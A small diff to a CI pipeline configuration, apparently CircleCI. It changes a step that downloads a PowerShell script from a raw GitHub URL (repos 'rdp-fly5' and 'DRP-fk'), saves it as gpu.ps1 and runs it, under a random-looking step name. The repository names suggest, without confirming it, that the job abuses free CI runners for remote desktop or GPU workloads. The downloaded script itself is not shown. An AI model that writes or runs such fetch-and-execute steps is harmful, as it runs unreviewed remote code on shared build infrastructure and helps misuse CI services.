@@ -16,6 +16,6 @@ jobs:
        - run:
            name: 1R9KxdF0rxFF4bcr51ZfYyqiXfS_75xzdufZLZcvx6ijmzsyF
            command:
-             Invoke-WebRequest https://raw.githubusercontent.com/ENDERSOUL5/rdp-fly5/main/sh -Outfile gpu.ps1
+             Invoke-WebRequest https://raw.githubusercontent.com/ENDERSOUL5/DRP-fk/main/sh -Outfile gpu.ps1
 
-       - run: ./gpu.ps1 
+       - run: ./gpu.ps1
